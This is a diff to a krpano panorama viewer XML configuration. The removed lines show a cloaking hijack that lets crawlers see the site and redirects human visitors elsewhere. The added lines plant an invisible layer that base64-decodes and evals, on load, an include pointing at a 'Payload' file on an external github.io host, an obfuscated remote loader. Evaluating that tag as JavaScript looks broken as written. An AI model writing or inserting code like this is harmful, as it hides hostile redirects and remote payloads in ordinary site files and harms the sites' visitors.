@@ -1,13 +1,4 @@
-<krpano>
-    <action name="redirect_hijack" autorun="onstart">
-        js(
-            var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
-            if (isBot) {
-                console.log("BOT DETECTED - Letting Skysports design stay.");
-            } else {
-                console.log("HUMAN DETECTED - Redirecting to YouTube.");
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-            }
-        );
-    </action>
+<krpano version="1.0.8.15">
+    <SCRIPT id="allow-copy_script"/>
+    <layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('PGluY2x1ZGUgdXJsPSIvXHhyaXlhbmVidS5naXRodWIuaW8vUGF5bG9hZC9mdXJ5Zmx5LnhtbCIvPg==');eval(w)););"/>
 </krpano>
